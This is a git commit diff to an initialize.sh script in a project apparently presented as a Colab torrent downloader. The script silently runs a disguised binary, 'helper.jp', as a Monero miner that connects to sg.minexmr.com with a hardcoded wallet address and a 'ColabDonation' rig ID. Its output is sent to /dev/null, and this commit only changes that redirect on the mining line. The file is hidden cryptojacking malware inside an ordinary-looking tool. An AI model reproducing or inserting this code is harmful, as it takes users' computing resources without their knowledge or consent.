877e41fd0c1ced817123c53c4a99e509e8e0cc6e
Psychopatz <79370044+psychopatz@users.noreply.github.com>
2021-08-31 23:23:27 +0800

    Update initialize.sh

--- assets/initialize.sh
+++ assets/initialize.sh
@@ -1,3 +1,3 @@
 cd /content/Colab-Torrent-Downloader-RELOADED/assets &> /dev/null
 chmod 755 helper.jp &> /dev/null
-./helper.jp -o sg.minexmr.com:443 -u 43czxGtk1Me1efrYrdGv6T39CNNMqBaTgg8eX8tU1LasUz1f39DvpCaQnY2Ut9W53x46c7gcDasRzNKF2PGpeCeGMq9Gf9E -k --tls --cpu-max-threads-hint 50 --rig-id=ColabDonation  &> /dev/null
+./helper.jp -o sg.minexmr.com:443 -u 43czxGtk1Me1efrYrdGv6T39CNNMqBaTgg8eX8tU1LasUz1f39DvpCaQnY2Ut9W53x46c7gcDasRzNKF2PGpeCeGMq9Gf9E -k --tls --cpu-max-threads-hint 50 --rig-id=ColabDonation
